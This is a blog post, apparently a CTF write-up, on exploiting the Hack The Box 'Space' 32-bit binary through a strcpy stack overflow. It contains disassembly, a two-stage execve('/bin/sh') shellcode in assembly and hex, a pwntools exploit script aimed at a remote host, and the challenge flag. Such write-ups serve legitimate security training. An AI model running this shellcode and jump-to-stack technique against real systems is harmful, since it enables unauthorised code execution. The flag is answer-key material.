@@ -1,0 +1,686 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  data-theme-mode="true"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  Space – HTB Challenge | 0xFl
+</title>
+<meta
+  name="description"
+  content="CTF Player who enjoys pwn challenges"
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://0xFlp.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="Space – HTB Challenge | 0xFl" />
+  <meta
+    property="og:description"
+    content="CTF Player who enjoys pwn challenges"
+  />
+  <meta property="og:url" content="https://0xFlp.github.io/post/space/" />
+  <meta
+    property="og:site_name"
+    content="0xFl Website"
+  />
+  <meta
+    property="og:image"
+    content="/images/CTFs_images/hackthebox.png"
+  />
+  <meta property="article:author" content="0xFl" />
+  <meta property="article:published_time" content="2025-09-12T12:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2025-09-12T12:00:00&#43;00:00" /><meta property="article:tag" content="pwnshellcodebuffer overflowi386" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/CTFs_images/hackthebox.png" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.58bb9bbaee29390070d1ce3a4bff4dc87e405b5611faa3321d511210d7ecb03e.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi "><img src="/images/cat-loading-unscreen.gif" alt="loading" /></div><div class="loading-word"></div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/home-icon.svg" alt="home icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/folder.svg" alt="archives icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/about.svg" alt="about icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '><img src="/images/icons/Flag.svg" alt="ctf icon" class="" style="height: 1em;"></div>
+        <a class="main-nav-link" href="/ctf">CTFs</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"></nav></div>
+<header id="header"><picture></picture>
+    <img  fetchpriority="high" src="/images/CTFs_images/hackthebox.png" alt="Space – HTB Challenge"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">Space – HTB Challenge</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          class="sidebar-left"
+            ><aside id="sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a>
+      <ul>
+        <li><a href="#initial-recon">Initial Recon</a></li>
+        <li><a href="#function-analysis">Function Analysis</a></li>
+        <li><a href="#vulnerable-function-analysis">Vulnerable Function Analysis</a></li>
+        <li><a href="#stack-layout--exploit-strategy">Stack Layout &amp; Exploit Strategy</a></li>
+        <li><a href="#shellcode">Shellcode</a></li>
+        <li><a href="#exploit-script">Exploit Script</a></li>
+        <li><a href="#flag-retrieved">Flag Retrieved</a></li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/test.webp"
+    data-sizes="auto"
+    alt="0xFl"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">0xFl</div>
+  <div class="sidebar-description">CTF Player who enjoys pwn challenges</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">4</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">13</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/0xFlp"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/home-icon.svg" alt="home icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/folder.svg" alt="archives icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/about.svg" alt="about icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/ctf"
+        aria-label="CTFs"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/Flag.svg" alt="ctf icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">CTFs</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-09-12 12:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2025-09-12</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-09-12</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/htb"
+      data-aos="zoom-in"
+      >HTB</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="challenge-description">
+<a class="header-anchor" href="#challenge-description"></a>
+Challenge Description
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">roaming in a small space
+</span></span></code></pre></div><p>This challenge is a classic <strong>shellcode injection</strong> on a 32-bit binary with minimal protections. The main constraint is the <strong>very limited space available</strong> for our attack.</p>
+<hr>
+<h3 id="initial-recon">
+<a class="header-anchor" href="#initial-recon"></a>
+Initial Recon
+</h3><p>Checking the file:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ file space
+</span></span><span class="line"><span class="cl">space: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
+</span></span><span class="line"><span class="cl">$ checksec space
+</span></span><span class="line"><span class="cl">Arch:       i386-32-little
+</span></span><span class="line"><span class="cl">RELRO:      No RELRO
+</span></span><span class="line"><span class="cl">Stack:      No canary found
+</span></span><span class="line"><span class="cl">NX:         NX unknown - GNU_STACK missing
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stack:      Executable
+</span></span><span class="line"><span class="cl">RWX:        Has RWX segments
+</span></span><span class="line"><span class="cl">Stripped:   No
+</span></span></code></pre></div><ul>
+<li><strong>32-bit ELF</strong></li>
+<li><strong>No NX / Stack Executable</strong></li>
+<li><strong>Not PIE</strong></li>
+<li><strong>RWX segment available</strong></li>
+<li><strong>No stack canary</strong></li>
+</ul>
+<p>This makes it suitable for a <strong>direct shellcode injection</strong>.</p>
+<hr>
+<h3 id="function-analysis">
+<a class="header-anchor" href="#function-analysis"></a>
+Function Analysis
+</h3><p>Listing functions:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mh">0x08049192</span>  <span class="n">_</span>       <span class="p">;</span> <span class="n">contains</span> <span class="n">JMP</span> <span class="n">ESP</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x080491a4</span>  <span class="n">vuln</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x080491cf</span>  <span class="n">main</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span></code></pre></div><p>Disassembly of <code>_</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">08049192</span> <span class="err">&lt;</span><span class="nf">_</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">push</span>   <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">call</span>   <span class="mi">0x8049243</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x212a</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">jmp</span>    <span class="no">esp</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">nop</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">pop</span>    <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">ret</span>
+</span></span></code></pre></div><p>Key observation:</p>
+<ul>
+<li>Contains a <strong><code>JMP ESP</code></strong> instruction → perfect for redirecting execution to our shellcode.</li>
+<li>Rare in binaries, but extremely useful when NX is disabled.</li>
+</ul>
+<hr>
+<h3 id="vulnerable-function-analysis">
+<a class="header-anchor" href="#vulnerable-function-analysis"></a>
+Vulnerable Function Analysis
+</h3><p><code>main</code> reads up to <strong>0x1f (31) bytes</strong> into <code>[ebp-0x27]</code> and then calls <code>vuln</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">080491</span><span class="nf">cf</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span><span class="line"><span class="cl"><span class="err">0804922</span><span class="nf">c</span> <span class="no">call</span> <span class="mh">0x80491a4</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="na">...</span>
+</span></span></code></pre></div><p><code>vuln</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">080491</span><span class="nf">a4</span> <span class="err">&lt;</span><span class="no">vuln</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">push</span> <span class="no">ebp</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">mov</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">esp</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">sub</span> <span class="no">esp</span><span class="p">,</span><span class="mi">0x14</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">call</span> <span class="mi">0x8049243</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">add</span> <span class="no">eax</span><span class="p">,</span><span class="mi">0x2114</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">push</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">]</span>  <span class="c1">; user input
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nf">lea</span> <span class="no">edx</span><span class="p">,[</span><span class="no">ebp-0xe</span><span class="p">]</span>          <span class="c1">; dest buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nf">push</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">call</span> <span class="no">strcpy</span>                <span class="c1">; unsafe copy!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="na">...</span>
+</span></span></code></pre></div><p>Analysis:</p>
+<ul>
+<li><strong>Destination buffer:</strong> <code>[ebp-0xe]</code> → 14 bytes</li>
+<li><strong>Source:</strong> <code>[ebp+0x8]</code> → user input</li>
+<li><strong>Overflow:</strong> <code>strcpy</code> copies until <code>\x00</code> → <strong>classic buffer overflow</strong></li>
+</ul>
+<p>Using <code>cyclic</code> to find the offset to EIP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pwndbg&gt; cyclic -l aafa
+</span></span><span class="line"><span class="cl">Found at offset <span class="m">18</span>
+</span></span></code></pre></div><ul>
+<li>Only <strong>18 bytes</strong> to reach EIP → small, but feasible with shellcode injection.</li>
+</ul>
+<hr>
+<h3 id="stack-layout--exploit-strategy">
+<a class="header-anchor" href="#stack-layout--exploit-strategy"></a>
+Stack Layout &amp; Exploit Strategy
+</h3><p>Due to the limited space before EIP, we perform a <strong>two-stage shellcode injection</strong>:</p>
+<ol>
+<li><strong>Stub:</strong> Adjust stack pointer (<code>sub esp, 0x15</code>) to create safe execution space.</li>
+<li><strong>Jump to shellcode:</strong> <code>jmp esp</code> from <code>_</code> instruction.</li>
+<li><strong>Main shellcode:</strong> Execute <code>/bin/sh</code>.</li>
+</ol>
+<hr>
+<h3 id="shellcode">
+<a class="header-anchor" href="#shellcode"></a>
+Shellcode
+</h3><p><strong>Assembly:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">section</span> <span class="no">.text</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">global</span> <span class="no">_start</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mul</span> <span class="no">ecx</span>                <span class="c1">; zero EAX
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">sub</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">0x15</span>          <span class="c1">; adjust stack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">jmp</span> <span class="no">esp</span>                <span class="c1">; jump to shellcode
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mi">0x68732f2f</span>        <span class="c1">; &#34;//sh&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">push</span> <span class="mi">0x6e69622f</span>        <span class="c1">; &#34;/bin&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mi">0x80</span>
+</span></span></code></pre></div><p><strong>Hex representation (Python payload):</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">\<span class="n">x31</span>\<span class="n">xc9</span>\<span class="n">xf7</span>\<span class="n">xe1</span>\<span class="n">x83</span>\<span class="n">xec</span>\<span class="n">x15</span>\<span class="n">xff</span>\<span class="n">xe4</span>\<span class="n">x50</span>\<span class="n">x68</span>\<span class="n">x2f</span>\<span class="n">x2f</span>\<span class="n">x73</span>\<span class="n">x68</span>\<span class="n">x68</span>\<span class="n">x2f</span>\<span class="n">x62</span>\<span class="n">x69</span>\<span class="n">x6e</span>\<span class="n">x89</span>\<span class="n">xe3</span>\<span class="n">xb0</span>\<span class="n">x0b</span>\<span class="n">xcd</span>\<span class="n">x80</span>
+</span></span></code></pre></div><p><strong>Explanation:</strong></p>
+<ul>
+<li><code>sub esp, 0x15</code> → creates safe space on stack to avoid corruption.</li>
+<li><code>jmp esp</code> → jumps to ESP, which points to shellcode after stub.</li>
+<li>Payload layout:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Shellcode last part] + [EIP = JMP ESP] + [Stub: sub esp, jmp esp]
+</span></span></code></pre></div><ul>
+<li>Stack grows downwards - this arrangement ensures proper execution.</li>
+</ul>
+<hr>
+<h3 id="exploit-script">
+<a class="header-anchor" href="#exploit-script"></a>
+Exploit Script
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;94.237.49.23&#34;</span><span class="p">,</span> <span class="mi">44964</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#34;./space&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">jmp_esp</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804919f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_first</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc9\xf7\xe1\x83\xec\x15\xff\xe4</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_last</span>  <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s2">&#34;</span>  <span class="c1"># 18 bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode_last</span> <span class="o">+</span> <span class="n">jmp_esp</span> <span class="o">+</span> <span class="n">shellcode_first</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><hr>
+<h3 id="flag-retrieved">
+<a class="header-anchor" href="#flag-retrieved"></a>
+Flag Retrieved
+</h3><figure><img src="/images/posts_images/htb/challenge/space/image.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HTB{sh3llc0de_1n_7h3_5p4c3}
+</span></span></code></pre></div><hr>
+<h3 id="summary">
+<a class="header-anchor" href="#summary"></a>
+Summary
+</h3><ul>
+<li><strong>Vulnerability:</strong> <code>strcpy</code> buffer overflow in 32-bit ELF with no NX.</li>
+<li><strong>Exploit:</strong> Two-stage shellcode injection due to very limited space (18 bytes to EIP).</li>
+</ul>
+<p>If you notice any inaccuracies or mistakes in this writeup, please feel free to contact me. I’d be happy to clarify or correct any information.</p>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/pwn"
+        rel="tag"
+        >PWN</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/shellcode"
+        rel="tag"
+        >SHELLCODE</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/buffer-overflow"
+        rel="tag"
+        >BUFFER OVERFLOW</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/i386"
+        rel="tag"
+        >I386</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+            data-src="images/cover_images/space.jpg"
+            data-sizes="auto"
+            alt="Idek CTF - MySpace2 PWN Writeup"
+            class="lazyload"
+          /><a href="/post/myspace2/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">Idek CTF - MySpace2 PWN Writeup</h3>
+      </div><div class="article-nav-link-wrap right"><img
+            data-src="images/CTFs_images/Sekai_CTF.png"
+            data-sizes="auto"
+            alt="Sekai Bank Mobile Reverse Engineering Challenge"
+            class="lazyload"
+          /><a href="/post/sekaibank_signature/"></a>
+        <div class="article-nav-caption">Next</div>
+        <h3 class="article-nav-title">Sekai Bank Mobile Reverse Engineering Challenge</h3>
+      </div></nav></article></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      0xFl
+    </div><div>
+        Powered by&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;1.4k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:09</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a>
+      <ul>
+        <li><a href="#initial-recon">Initial Recon</a></li>
+        <li><a href="#function-analysis">Function Analysis</a></li>
+        <li><a href="#vulnerable-function-analysis">Vulnerable Function Analysis</a></li>
+        <li><a href="#stack-layout--exploit-strategy">Stack Layout &amp; Exploit Strategy</a></li>
+        <li><a href="#shellcode">Shellcode</a></li>
+        <li><a href="#exploit-script">Exploit Script</a></li>
+        <li><a href="#flag-retrieved">Flag Retrieved</a></li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/test.webp"
+    data-sizes="auto"
+    alt="0xFl"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">0xFl</div>
+  <div class="sidebar-description">CTF Player who enjoys pwn challenges</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">4</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">13</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/0xFlp"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '><img src="/images/icons/home-icon.svg" alt="home icon" class="" style="height: 1em;"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
